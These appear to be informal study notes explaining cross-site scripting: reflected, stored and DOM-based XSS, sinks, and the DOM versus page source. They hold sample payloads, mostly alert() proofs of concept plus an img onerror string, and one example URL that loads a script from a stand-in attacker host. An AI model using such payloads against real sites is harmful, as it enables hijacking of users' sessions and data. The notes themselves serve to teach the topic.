=> What is cross-site scripting (XSS)?
XSS is a web security vulnerability that allows an attacker to compromise the interactions that users have with a vulnerable application. It allows an attacker to circumvent the same origin policy,
which is designed to segregate different websites from each other.

=> How does XSS work?
XSS works by manipulating a vulnerable web site so that it returns malicious JavaScript to users. When the malicious code execute inside a victim's browser, the attacker can compromise their interaction
with the application. 

Example: https://insecure-website.com/comment?message=<script src=https://evil-user.net/badscript.js></script>

=> XSS Proof of concept
alert()
print()

=> Types of XSS attacks?

1: Reflected XSS (It reflects the query result immediately)
2: Stored XSS (It store the query in database and wait until executed by user visiting the page like 'post comment'
3: DOM-based XSS (It is used to manipulate the HTML of the page called DOM)

-> Reflected XSS: is the simplest variety of cross-site scripting. It arises when an application receives data in an HTTP request and includes that data within the immediate response in an
unsafe way.

--------------------Reflected XSS------------------------------------
https://insecure-website.com/status?message=All+is+well.
<p>status: all is well.</p> 

The applicationi doesn't perform any other processing of the data, so an attacker can easily construct an attack like this:

https://insecure-website.com/status?message=<script>/*+bad+stuff+here...+*/</script>
<p>status: <script>/* bad stuff here--*/</script></p>

-----------------Stored XSS----------------------------
<script>alert('you are hacked')</script>

For example, when you add the query in comment of any post.


-----------------DOM XSS ----------------------------
<img src="unsecure.com/resources/images/product?searchitem=hackyou" onload="alert()>

Added DOM XSS query=> hackyou" onload="alert()

Question: what is sink like document.write sink | innerHTML sink

If we directly pass '<script>alert(3)</script> would not be executed because it is part of security so we need to pass something like <img src='0' onerror=alert(1)>. It is not compulsory to 
pass <img> tag, can be pass something else. 
-----------------------------------------------------

View source code vs Script 

View source code does not show DOM manipulation, only show real source code retrive from server. But script code showes DOM manipulation.
